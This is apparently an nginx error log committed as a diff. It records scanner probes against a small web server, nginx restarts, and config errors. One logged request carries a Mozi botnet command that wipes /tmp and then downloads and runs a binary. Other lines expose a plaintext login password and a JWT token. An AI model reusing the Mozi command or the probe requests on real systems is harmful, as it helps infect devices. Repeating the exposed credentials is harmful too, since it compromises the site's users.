+2021/11/01 09:59:01 [error] 25#25: *189098 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 8.142.74.87, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "123.56.131.199"
+2021/11/01 09:59:01 [error] 25#25: *189101 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 8.142.74.87, server: localhost, request: "GET /evox/about HTTP/1.1", host: "123.56.131.199"
+2021/11/01 09:59:12 [error] 25#25: *189105 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 8.142.74.87, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "123.56.131.199"
+2021/11/01 09:59:12 [error] 25#25: *189106 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 8.142.74.87, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "123.56.131.199"
+2021/11/01 09:59:27 [error] 25#25: *189107 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 93.158.92.234, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "sincos.vip"
+2021/11/01 09:59:28 [error] 25#25: *189108 open() "/usr/share/nginx/html/humans.txt" failed (2: No such file or directory), client: 93.158.92.226, server: localhost, request: "GET /humans.txt HTTP/1.1", host: "sincos.vip"
+2021/11/01 09:59:29 [error] 25#25: *189109 open() "/usr/share/nginx/html/ads.txt" failed (2: No such file or directory), client: 93.158.92.233, server: localhost, request: "GET /ads.txt HTTP/1.1", host: "sincos.vip"
+2021/11/01 10:17:33 [error] 25#25: *189113 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 37.120.222.136, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/11/01 12:28:45 [error] 25#25: *189124 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 58.252.205.109, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "123.56.131.199:80"
+2021/11/01 14:47:22 [error] 25#25: *189133 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/01 15:06:36 [error] 25#25: *189134 open() "/usr/share/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 206.221.176.148, server: localhost, request: "GET http://1.1.1.1/cdn-cgi/trace HTTP/1.1", host: "1.1.1.1"
+2021/11/01 15:10:50 [error] 25#25: *189135 open() "/usr/share/nginx/html/wp-login.php" failed (2: No such file or directory), client: 167.71.206.107, server: localhost, request: "GET /wp-login.php HTTP/1.1", host: "sincos.vip"
+2021/11/01 17:51:39 [error] 25#25: *189141 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/01 19:34:06 [error] 25#25: *189143 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 65.21.206.43, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "sincos.vip"
+2021/11/01 20:16:36 [error] 25#25: *189146 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.62.185, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "123.56.131.199:80"
+2021/11/01 20:21:37 [error] 25#25: *189148 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 54.203.73.198, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "sincos.vip"
+2021/11/01 20:21:41 [error] 25#25: *189149 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 54.203.73.198, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "sincos.vip"
+2021/11/01 20:51:11 [error] 25#25: *189150 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.54.186, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/02 02:05:11 [error] 25#25: *189165 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.62.185, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "123.56.131.199:80"
+2021/11/02 03:06:06 [error] 25#25: *189174 open() "/usr/share/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 206.221.176.148, server: localhost, request: "GET http://1.1.1.1/cdn-cgi/trace HTTP/1.1", host: "1.1.1.1"
+2021/11/02 03:42:42 [error] 25#25: *189178 open() "/usr/share/nginx/html/portal/redlion" failed (2: No such file or directory), client: 192.241.209.224, server: localhost, request: "GET /portal/redlion HTTP/1.1", host: "123.56.131.199"
+2021/11/02 04:10:14 [error] 25#25: *189179 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/02 04:15:40 [error] 25#25: *189180 open() "/usr/share/nginx/html/actuator/health" failed (2: No such file or directory), client: 192.241.198.185, server: localhost, request: "GET /actuator/health HTTP/1.1", host: "123.56.131.199"
+2021/11/02 04:18:55 [error] 25#25: *189183 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 183.136.226.3, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "123.56.131.199:80"
+2021/11/02 07:49:33 [error] 25#25: *189195 open() "/usr/share/nginx/html/cache/global/img/gs.gif" failed (2: No such file or directory), client: 89.248.164.165, server: localhost, request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
+2021/11/02 09:53:46 [error] 25#25: *189197 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/02 11:27:40 [error] 25#25: *189204 open() "/usr/share/nginx/html/archivarix.cms.php" failed (2: No such file or directory), client: 164.132.128.23, server: localhost, request: "GET /archivarix.cms.php HTTP/1.1", host: "sincos.vip"
+2021/11/02 11:40:28 [error] 25#25: *189205 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/02 11:48:48 [error] 25#25: *189206 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 178.72.78.219, server: localhost, request: "POST /HNAP1/ HTTP/1.0", host: "123.56.131.199:80"
+2021/11/02 12:21:52 [error] 25#25: *189211 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 194.49.68.31, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/11/02 17:12:05 [error] 25#25: *189226 open() "/usr/share/nginx/html/cache/global/img/gs.gif" failed (2: No such file or directory), client: 89.248.164.165, server: localhost, request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
+2021/11/02 19:21:28 [error] 25#25: *189228 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 89.252.177.18, server: localhost, request: "GET /.env HTTP/1.1", host: "www.sincos.vip"
+2021/11/02 19:21:28 [error] 25#25: *189229 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 89.252.177.18, server: localhost, request: "GET /.env HTTP/1.1", host: "sincos.vip"
+2021/11/02 19:47:10 [error] 25#25: *189232 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 213.238.178.239, server: localhost, request: "GET /.env HTTP/1.1", host: "www.sincos.vip"
+2021/11/02 19:47:10 [error] 25#25: *189233 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 213.238.178.239, server: localhost, request: "GET /.env HTTP/1.1", host: "sincos.vip"
+2021/11/02 20:03:18 [error] 25#25: *189235 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/02 20:09:17 [error] 25#25: *189238 open() "/usr/share/nginx/html/echo.php" failed (2: No such file or directory), client: 5.188.210.227, server: localhost, request: "GET http://5.188.210.227/echo.php HTTP/1.1", host: "5.188.210.227", referrer: "https://www.google.com/"
+2021/11/02 20:51:14 [error] 25#25: *189244 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.62.185, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "123.56.131.199:80"
+2021/11/02 20:58:19 [error] 25#25: *189249 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 193.142.146.242, server: localhost, request: "POST /HNAP1/ HTTP/1.1", host: "123.56.131.199:80"
+2021/11/02 21:29:03 [error] 25#25: *189251 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 54.191.22.21, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "sincos.vip"
+2021/11/02 22:07:53 [error] 25#25: *189256 open() "/usr/share/nginx/html/dispatch.asp" failed (2: No such file or directory), client: 23.146.241.135, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "123.56.131.199:80"
+2021/11/03 02:00:28 [error] 25#25: *189267 open() "/usr/share/nginx/html/wp-class.php" failed (2: No such file or directory), client: 132.145.9.189, server: localhost, request: "GET /wp-class.php HTTP/1.1", host: "sincos.vip"
+2021/11/03 02:34:32 [error] 25#25: *189268 open() "/usr/share/nginx/html/cache/global/img/gs.gif" failed (2: No such file or directory), client: 89.248.164.165, server: localhost, request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
+2021/11/03 03:01:47 [error] 25#25: *189270 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.134.225.15, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/03 03:03:48 [error] 25#25: *189271 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 182.59.36.23, server: localhost, request: "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0"
+2021/11/03 03:28:15 [error] 25#25: *189272 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/03 04:02:25 [error] 25#25: *189279 open() "/usr/share/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 206.221.176.148, server: localhost, request: "GET http://1.1.1.1/cdn-cgi/trace HTTP/1.1", host: "1.1.1.1"
+2021/11/03 04:13:22 [error] 25#25: *189280 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/03 06:03:20 [error] 25#25: *189294 open() "/usr/share/nginx/html/nice ports,/Trinity.txt.bak" failed (2: No such file or directory), client: 165.227.136.172, server: localhost, request: "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0"
+2021/11/03 06:27:21 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/11/03 06:27:21 [notice] 26#26: gracefully shutting down
+2021/11/03 06:27:21 [notice] 26#26: exiting
+2021/11/03 06:27:21 [notice] 26#26: exit
+2021/11/03 06:27:21 [notice] 25#25: gracefully shutting down
+2021/11/03 06:27:21 [notice] 25#25: exiting
+2021/11/03 06:27:21 [notice] 25#25: exit
+2021/11/03 06:27:21 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2021/11/03 06:27:21 [notice] 1#1: worker process 25 exited with code 0
+2021/11/03 06:27:21 [notice] 1#1: signal 29 (SIGIO) received
+2021/11/03 06:27:21 [notice] 1#1: signal 17 (SIGCHLD) received from 26
+2021/11/03 06:27:21 [notice] 1#1: worker process 26 exited with code 0
+2021/11/03 06:27:21 [notice] 1#1: exit
+2021/11/03 08:25:52 [emerg] 1#1: unexpected "}" in /etc/nginx/conf.d/main.conf:11
+2021/11/03 08:29:34 [emerg] 1#1: unexpected "}" in /etc/nginx/conf.d/main.conf:11
+2021/11/03 08:30:06 [emerg] 1#1: unexpected "}" in /etc/nginx/conf.d/main.conf:11
+2021/11/03 08:30:46 [warn] 1#1: conflicting server name "main.sincos.vip" on 0.0.0.0:80, ignored
+2021/11/03 08:30:46 [warn] 1#1: conflicting server name "main.sincos.vip" on [::]:80, ignored
+2021/11/03 08:30:46 [notice] 1#1: using the "epoll" event method
+2021/11/03 08:30:46 [notice] 1#1: nginx/1.21.3
+2021/11/03 08:30:46 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/11/03 08:30:46 [notice] 1#1: OS: Linux 3.10.0-1160.42.2.el7.x86_64
+2021/11/03 08:30:46 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/11/03 08:30:46 [notice] 1#1: start worker processes
+2021/11/03 08:30:46 [notice] 1#1: start worker process 25
+2021/11/03 08:30:46 [notice] 1#1: start worker process 26
+2021/11/03 08:31:24 [error] 25#25: *5 open() "/usr/share/nginx/html/login" failed (2: No such file or directory), client: 124.205.77.86, server: localhost, request: "POST /login?name=bbbbbb&password=10293040 HTTP/1.1", host: "dorm.sincos.vip"
+2021/11/03 08:31:27 [error] 25#25: *6 open() "/usr/share/nginx/html/list" failed (2: No such file or directory), client: 124.205.77.86, server: localhost, request: "POST /list?page=1&num=20&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJiYmJiYiIsInBhc3N3b3JkIjoiMTAyOTMwNDAiLCJleHAiOjE2MzQ5MjA3NjAsImlzcyI6Imdpbi1ibG9nIn0.UQWZrJ0HO7guAJRS5oHn9FMkxIvVSvZgQmhPWj2Jq-8 HTTP/1.1", host: "dorm.sincos.vip"
+2021/11/03 08:32:04 [error] 25#25: *14 open() "/usr/share/nginx/html/login" failed (2: No such file or directory), client: 124.205.77.86, server: localhost, request: "POST /login?name=bbbbbb&password=10293040 HTTP/1.1", host: "dorm.sincos.vip"
+2021/11/03 08:32:05 [error] 25#25: *15 open() "/usr/share/nginx/html/login" failed (2: No such file or directory), client: 124.205.77.86, server: localhost, request: "POST /login?name=bbbbbb&password=10293040 HTTP/1.1", host: "dorm.sincos.vip"
+2021/11/03 08:32:05 [error] 25#25: *16 open() "/usr/share/nginx/html/login" failed (2: No such file or directory), client: 124.205.77.86, server: localhost, request: "POST /login?name=bbbbbb&password=10293040 HTTP/1.1", host: "dorm.sincos.vip"
+2021/11/03 08:32:43 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/11/03 08:32:43 [notice] 25#25: gracefully shutting down
+2021/11/03 08:32:43 [notice] 25#25: exiting
+2021/11/03 08:32:43 [notice] 25#25: exit
+2021/11/03 08:32:43 [notice] 26#26: gracefully shutting down
+2021/11/03 08:32:43 [notice] 26#26: exiting
+2021/11/03 08:32:43 [notice] 26#26: exit
+2021/11/03 08:32:43 [notice] 1#1: signal 17 (SIGCHLD) received from 26
+2021/11/03 08:32:43 [notice] 1#1: worker process 26 exited with code 0
+2021/11/03 08:32:43 [notice] 1#1: signal 29 (SIGIO) received
+2021/11/03 08:32:43 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2021/11/03 08:32:43 [notice] 1#1: worker process 25 exited with code 0
+2021/11/03 08:32:43 [notice] 1#1: exit
+2021/11/03 08:32:43 [warn] 1#1: conflicting server name "main.sincos.vip" on 0.0.0.0:80, ignored
+2021/11/03 08:32:43 [warn] 1#1: conflicting server name "main.sincos.vip" on [::]:80, ignored
+2021/11/03 08:32:43 [notice] 1#1: using the "epoll" event method
+2021/11/03 08:32:43 [notice] 1#1: nginx/1.21.3
+2021/11/03 08:32:43 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/11/03 08:32:43 [notice] 1#1: OS: Linux 3.10.0-1160.42.2.el7.x86_64
+2021/11/03 08:32:43 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/11/03 08:32:43 [notice] 1#1: start worker processes
+2021/11/03 08:32:43 [notice] 1#1: start worker process 24
+2021/11/03 08:32:43 [notice] 1#1: start worker process 25
+2021/11/03 08:33:51 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/11/03 08:33:51 [notice] 24#24: gracefully shutting down
+2021/11/03 08:33:51 [notice] 24#24: exiting
+2021/11/03 08:33:51 [notice] 24#24: exit
+2021/11/03 08:33:51 [notice] 25#25: gracefully shutting down
+2021/11/03 08:33:51 [notice] 25#25: exiting
+2021/11/03 08:33:51 [notice] 25#25: exit
+2021/11/03 08:33:51 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/11/03 08:33:51 [notice] 1#1: worker process 24 exited with code 0
+2021/11/03 08:33:51 [notice] 1#1: worker process 25 exited with code 0
+2021/11/03 08:33:51 [notice] 1#1: exit
+2021/11/03 08:33:51 [notice] 1#1: using the "epoll" event method
+2021/11/03 08:33:51 [notice] 1#1: nginx/1.21.3
+2021/11/03 08:33:51 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/11/03 08:33:51 [notice] 1#1: OS: Linux 3.10.0-1160.42.2.el7.x86_64
+2021/11/03 08:33:51 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/11/03 08:33:51 [notice] 1#1: start worker processes
+2021/11/03 08:33:51 [notice] 1#1: start worker process 25
+2021/11/03 08:33:51 [notice] 1#1: start worker process 26
+2021/11/03 08:42:40 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/11/03 08:42:40 [notice] 26#26: gracefully shutting down
+2021/11/03 08:42:40 [notice] 26#26: exiting
+2021/11/03 08:42:40 [notice] 26#26: exit
+2021/11/03 08:42:40 [notice] 25#25: gracefully shutting down
+2021/11/03 08:42:40 [notice] 25#25: exiting
+2021/11/03 08:42:40 [notice] 25#25: exit
+2021/11/03 08:42:40 [notice] 1#1: signal 17 (SIGCHLD) received from 26
+2021/11/03 08:42:40 [notice] 1#1: worker process 26 exited with code 0
+2021/11/03 08:42:40 [notice] 1#1: signal 29 (SIGIO) received
+2021/11/03 08:42:40 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2021/11/03 08:42:40 [notice] 1#1: worker process 25 exited with code 0
+2021/11/03 08:42:40 [notice] 1#1: exit
+2021/11/03 08:42:52 [notice] 1#1: using the "epoll" event method
+2021/11/03 08:42:52 [notice] 1#1: nginx/1.21.3
+2021/11/03 08:42:52 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/11/03 08:42:52 [notice] 1#1: OS: Linux 3.10.0-1160.42.2.el7.x86_64
+2021/11/03 08:42:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/11/03 08:42:52 [notice] 1#1: start worker processes
+2021/11/03 08:42:52 [notice] 1#1: start worker process 25
+2021/11/03 08:42:52 [notice] 1#1: start worker process 26
+2021/11/03 08:43:07 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/11/03 08:43:07 [notice] 25#25: gracefully shutting down
+2021/11/03 08:43:07 [notice] 25#25: exiting
+2021/11/03 08:43:07 [notice] 25#25: exit
+2021/11/03 08:43:07 [notice] 26#26: gracefully shutting down
+2021/11/03 08:43:07 [notice] 26#26: exiting
+2021/11/03 08:43:07 [notice] 26#26: exit
+2021/11/03 08:43:07 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2021/11/03 08:43:07 [notice] 1#1: worker process 25 exited with code 0
+2021/11/03 08:43:07 [notice] 1#1: signal 29 (SIGIO) received
+2021/11/03 08:43:07 [notice] 1#1: signal 17 (SIGCHLD) received from 26
+2021/11/03 08:43:07 [notice] 1#1: worker process 26 exited with code 0
+2021/11/03 08:43:07 [notice] 1#1: exit
